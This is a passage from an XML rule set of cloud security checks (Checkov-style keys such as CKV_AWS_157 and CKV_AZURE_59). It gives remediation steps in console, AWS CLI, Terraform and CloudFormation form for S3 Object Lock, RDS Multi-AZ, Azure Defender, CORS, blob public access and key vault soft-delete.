<li>Under Versioning, select Keep all versions of an object in the same bucket checkbox to enable S3 versioning for the bucket. S3 Object Lock requires S3 object versioning.</li>
<li>Click the Advanced settings tab to shown the advanced configuration settings.</li>
<li>Under Object lock, select Permanently allow objects in this bucket to be locked checkbox to enable S3 Object Lock feature for the new bucket.</li>
<li>Click Next.</li>
</ul></li>
<li>For step 3: Set permissions, set any required permissions or leave the settings unchanged to reflect the source bucket permissions configuration. Click Next to continue.<ul>
<li>For step 4: Review, verify the resource configuration details, then click Create bucket to create the new S3 bucket.</li>
</ul></li>
</ul>
<ol start="5">
<li>Click on the name of the S3 bucket created at the previous step.</li>
<li>Select the Properties tab from the S3 dashboard top menu to view bucket properties.</li>
<li>In the Advanced settings section, click on the Object Lock box to access the feature configuration panel, where you can define the automatic settings for the objects that are uploaded without object lock configuration.</li>
<li>Inside Object Lock box, select one of the following retention modes. These retention modes apply different levels of protection to the objects within the selected bucket:</li>
</ol>
<ul>
<li>Select Enable governance mode so that users cannot overwrite or delete an S3 object version or alter its lock settings unless they have special permissions (e.g. root account). Governance mode enables you to protect objects against deletion by most users while still allowing you to grant some users permission to alter the retention settings or delete the object if required. In the Retention period box, enter the number of days required to protect an object version. Click Save to apply the changes.</li>
<li>Select Enable compliance mode so that a protected object version cannot be overwritten or deleted by any user, including the root account user. Once an S3 object is locked in Compliance mode, its retention mode cannot be reconfigured and its retention period cannot be shortened. This retention mode ensures that an object version can't be overwritten or deleted for the duration of the retention period, specified in the Retention period box. Click Save to apply the changes.</li>
</ul>
<ol start="9">
<li>Now you can transfer the necessary S3 objects from the source bucket, the one with Object Lock feature disabled, to the destination bucket, the one that has Object Lock enabled.</li>
<li>Repeat steps no. 3 &#8211; 9 to enable and configure Amazon S3 Object Lock for other S3 buckets available within your AWS account.</li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<ol>
<li>Run create-bucket command (OSX/Linux/UNIX) to (re)create the required Amazon S3 bucket and enable S3 Object Lock feature for all the objects uploaded to this bucket, by using the --object-lock-enabled-for-bucket command parameter:</li>
</ol>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Shell</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-shell theme-light" data-lang="shell" name="">aws s3api create-bucket
    --bucket cc-project5-protected-logs
    --region us-east-1
    --acl private
    --object-lock-enabled-for-bucket
</code></pre></div></div>
<ol start="2">
<li>The command output should return the name of the new Amazon S3 bucket:</li>
</ol>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Shell</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-shell theme-light" data-lang="shell" name="">{
    "Location": "/cc-project5-protected-logs"
}
</code></pre></div></div>
<ol start="3">
<li>Define the Object Lock feature configuration parameters by specifying the retention mode and retention period for the new S3 bucket. The following example enables Governance retention mode for 90 days. Governance mode ensures that users cannot overwrite or delete an S3 object version or alter its lock settings unless they have special permissions (e.g. root account access). Governance mode enables you to protect objects against deletion by most users while still allowing you to grant some users permission to alter the retention settings or delete the object if required. Save these configuration parameters to a JSON file named object-lock-config.json:</li>
</ol>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Shell</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-shell theme-light" data-lang="shell" name="">{
  "ObjectLockEnabled": "Enabled",
  "Rule": {
    "DefaultRetention": {
      "Mode": "GOVERNANCE",
      "Days": 90
    }
  }
}
</code></pre></div></div>
<ol start="4">
<li>Run put-object-lock-configuration command (OSX/Linux/UNIX) using the configuration parameters defined at the previous step (i.e. object-lock-config.json) to apply your S3 Object Lock configuration to the newly created bucket (the command does not produce an output):</li>
</ol>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Shell</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-shell theme-light" data-lang="shell" name="">aws s3api put-object-lock-configuration
    --bucket cc-project5-protected-logs
    --object-lock-configuration file://object-lock-config.json
</code></pre></div></div>
<ol start="5">
<li>
<p>Transfer the necessary S3 objects from the source bucket, the one with Object Lock feature disabled, to the destination bucket, the one with S3 Object Lock enabled, created at the previous steps.</p>
</li>
<li>
<p>Repeat steps no. 1 &#8211; 5 to enable and configure Amazon S3 Object Lock for other S3 buckets available in your AWS account.</p>
</li>
</ol>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> aws_s3_bucket</li>
<li><strong>Argument:</strong> object_lock_enabled</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_s3_bucket" "test" {
   ...
+  object_lock_configuration = {
+     object_lock_enabled = "Enabled"
+  }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-s3-bucket-has-lock-configuration-enabled-by-default' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-s3-bucket-has-lock-configuration-enabled-by-default</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-s3-bucket-has-lock-configuration-enabled-by-default' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_157</key>
    <name>Ensure RDS instances have Multi-AZ enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="rds-instances-do-not-have-multi-az-enabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-rds-instances-do-not-have-multi-az-enabled"></div>RDS instances do not have Multi-AZ enabled</div><a aria-label="Skip link to RDS instances do not have Multi-AZ enabled" class="heading-anchor-icon fa fa-anchor" href="#rds-instances-do-not-have-multi-az-enabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Amazon RDS Multi-AZ deployments provide enhanced availability for databases within a single region. In the event of a planned or unplanned outage of your DB instance, Amazon RDS automatically switches to a standby replica in another Availability Zone if you have enabled Multi-AZ.</p>
<p>RDS Multi-AZ deployments offer the following benefits:</p>
<ol>
<li>Enhanced durability. </li>
<li>Increased availability. </li>
<li>Protection of your database performance. </li>
<li>Automatic failover. </li>
</ol>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-console"></div>AWS Console</div><a aria-label="Skip link to AWS Console" class="heading-anchor-icon fa fa-anchor" href="#aws-console"></a></h2>
<ol>
<li>Log in to the AWS Management Console at <a href="https://console.aws.amazon.com/" target="_self">https://console.aws.amazon.com/</a>.</li>
<li>Open the <strong><a href="https://console.aws.amazon.com/rds/" target="_self">Amazon RDS console</a></strong>. </li>
<li>To create a new Multi-AZ deployment using the AWS Management Console, simply click the "Yes" option for "Multi-AZ Deployment" when launching a DB Instance. </li>
<li>To convert an existing Single-AZ DB Instance to a Multi-AZ deployment, use the "Modify" option corresponding to your DB Instance in the AWS Management Console.</li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<p>If you use the <button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">create-db-instance</code> AWS CLI command to create a Multi-AZ DB instance, set the <button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">--multi-az</code> parameter to <button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">true</code>. If you use the CreateDBInstance API operation, set the <button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">MultiAZ</code> parameter to <button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">true</code>. You can't set the <button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">AvailabilityZone</code> parameter if the DB instance is a Multi-AZ deployment.</p>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Shell</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-shell theme-light" data-lang="shell" name="">aws rds create-db-instance \
    --db-instance-identifier test-mysql-instance \
    --db-instance-class db.t3.micro \
    --engine mysql \
    --master-username admin \
    --master-user-password secret99 \
    --allocated-storage 20 \
    --multi-az true
</code></pre></div></div>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: aws_db_instance</li>
<li><strong>Argument</strong>: multi_az - Specifies if the RDS instance is Multi-AZ. </li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_db_instance" "default" {
  ...
  name                 = "mydb"
+ multi_az             = true 
}
</code></pre></div></div>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cloudformation"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cloud-formation"></div>CloudFormation</div><a aria-label="Skip link to CloudFormation" class="heading-anchor-icon fa fa-anchor" href="#cloudformation"></a></h2>
<ul>
<li><strong>Resource</strong>: AWS::RDS::DBInstance</li>
<li><strong>Argument</strong>: Properties.MultiAZ</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">Resources:
  MyDBEnabled:
    Type: 'AWS::RDS::DBInstance'
    Properties:
      ...
+     MultiAZ: true
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/general_73' target='_blank'> https://docs.bridgecrew.io/docs/general_73</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/general_73' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_55</key>
    <name>Ensure Azure Security Center Defender is set to On for servers</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-security-center-defender-is-set-to-off-for-servers"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-security-center-defender-is-set-to-off-for-servers"></div>Azure Security Center Defender is set to Off for servers</div><a aria-label="Skip link to Azure Security Center Defender is set to Off for servers" class="heading-anchor-icon fa fa-anchor" href="#azure-security-center-defender-is-set-to-off-for-servers"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Azure Defender is a cloud workload protection service that utilizes and agent-based deployment to analyze signals from Azure network fabric and the service control plane, to detect threats across all Azure resources. It can also analyze non-Azure resources, utilizing Azure Arc, including those on-premises and in both AWS and GCP (once they've been onboarded). </p>
<p>Azure Defender for servers adds threat detection and advanced defenses for Windows and Linux machines.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> azurerm_security_center_subscription_pricing</li>
<li><strong>Argument:</strong> resource_type - (Required) The resource type this setting affects. Ensure that <button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">SqlServers</code> is declared to pass this check.</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_security_center_subscription_pricing" "example" {
  tier          = "Standard"
  resource_type = "AppServices,ContainerRegistry,KeyVaults,KubernetesService,SqlServers,SqlServerVirtualMachines,StorageAccounts,VirtualMachines,ARM,DNS"
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-azure-defender-is-set-to-on-for-servers' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-azure-defender-is-set-to-on-for-servers</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-azure-defender-is-set-to-on-for-servers' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_56</key>
    <name>Ensure Azure function app authentication is on</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-function-app-authentication-is-off"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-function-app-authentication-is-off"></div>Azure function app authentication is off</div><a aria-label="Skip link to Azure function app authentication is off" class="heading-anchor-icon fa fa-anchor" href="#azure-function-app-authentication-is-off"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Azure App Service Authentication is a feature that can prevent anonymous HTTP requests from reaching the Function app, or authenticate those that have tokens before they reach the Function app.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> azurerm_function_app</li>
<li><strong>Argument:</strong> auth_settings.enabled</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_function_app" "example" {
              ...
 +            auth_settings {
 +              enabled = true
              }
            }
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-function-apps-enables-authentication' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-function-apps-enables-authentication</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-function-apps-enables-authentication' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_57</key>
    <name>Ensure CORS disallows resource to access app services</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="cors-allows-resource-to-access-app-services"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cors-allows-resource-to-access-app-services"></div>CORS allows resource to access app services</div><a aria-label="Skip link to CORS allows resource to access app services" class="heading-anchor-icon fa fa-anchor" href="#cors-allows-resource-to-access-app-services"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Cross-Origin Resource Sharing (CORS) should not allow all domains to access your web application. Allow only required domains to interact with your web app.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> azurerm_app_service</li>
<li><strong>Argument:</strong> cors </li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_app_service" "example" {
                 ...                        
                site_config {
+             cors {
+                    allowed_origins = ["192.0.0.1"]
+                                   }
            }
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-cors-disallows-every-resource-to-access-app-services' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-cors-disallows-every-resource-to-access-app-services</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-cors-disallows-every-resource-to-access-app-services' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_58</key>
    <name>Ensure Azure Synapse Workspaces enable managed virtual networks</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-synapse-workspaces-do-not-enable-managed-virtual-networks"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-synapse-workspaces-do-not-enable-managed-virtual-networks"></div>Azure Synapse Workspaces do not enable managed virtual networks</div><a aria-label="Skip link to Azure Synapse Workspaces do not enable managed virtual networks" class="heading-anchor-icon fa fa-anchor" href="#azure-synapse-workspaces-do-not-enable-managed-virtual-networks"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>TBA</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> azurerm_synapse_workspace</li>
<li><strong>Argument:</strong> managed_virtual_network_enabled</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_synapse_workspace" "example" {
                            ...
+             managed_virtual_network_enabled      = true                
            }
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-azure-synapse-workspaces-enables-managed-virtual-networks' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-azure-synapse-workspaces-enables-managed-virtual-networks</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-azure-synapse-workspaces-enables-managed-virtual-networks' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_59</key>
    <name>Ensure Azure storage account does not allow blob containers with public access</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-storage-account-allows-blob-container-with-public-access"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-storage-account-allows-blob-container-with-public-access"></div>Azure storage account allows blob container with public access</div><a aria-label="Skip link to Azure storage account allows blob container with public access" class="heading-anchor-icon fa fa-anchor" href="#azure-storage-account-allows-blob-container-with-public-access"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>As a best practice, do not allow anonymous/public access to blob containers unless you have a very good reason. Instead, you should consider using a shared access signature token for providing controlled and time-limited access to blob containers.\n\n'Public access level' allows you to grant anonymous/public read access to a container and the blobs within Azure blob storage. By doing so, you can grant read-only access to these resources without sharing your account key, and without requiring a shared access signature.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="in-azure-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-in-azure-console"></div>In Azure Console</div><a aria-label="Skip link to In Azure Console" class="heading-anchor-icon fa fa-anchor" href="#in-azure-console"></a></h2>
<ol>
<li>Log in to the Azure portal</li>
<li>Navigate to 'Storage Accounts'</li>
<li>Select the reported storage account</li>
<li>Under 'Blob service' section, Select 'Containers'</li>
<li>Select the blob container you need to modify</li>
<li>Click on 'Change access level'</li>
<li>Set 'Public access level' to 'Private (no anonymous access)'</li>
<li>Click on 'OK'</li>
</ol>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> azurerm_storage_account</li>
<li><strong>Argument:</strong> allow_blob_public_access</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_storage_account" "example" {
              ...
+             allow_blob_public_access = false
              ...
            }
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-storage-accounts-disallow-public-access' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-storage-accounts-disallow-public-access</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-storage-accounts-disallow-public-access' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_111</key>
    <name>Ensure key vault enables soft-delete</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="key-vault-does-not-enable-soft-delete"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-key-vault-does-not-enable-soft-delete"></div>Key vault does not enable soft-delete</div><a aria-label="Skip link to Key vault does not enable soft-delete" class="heading-anchor-icon fa fa-anchor" href="#key-vault-does-not-enable-soft-delete"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Deleting a key vault without soft delete enabled permanently deletes all secrets, keys, and certificates stored in the key vault. Accidental deletion of a key vault can lead to permanent data loss. Soft delete allows you to recover an accidentally deleted key vault for a configurable retention period.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> azurerm_key_vault</li>
<li><strong>Argument:</strong> soft_delete_retention_days - (Optional) The number of days that items should be retained for once soft-deleted. This value can be between 7 and 90 (the default) days.</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_key_vault" "example" {
  ...
+   soft_delete_retention_days  = 7
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-key-vault-enables-soft-delete' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-key-vault-enables-soft-delete</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
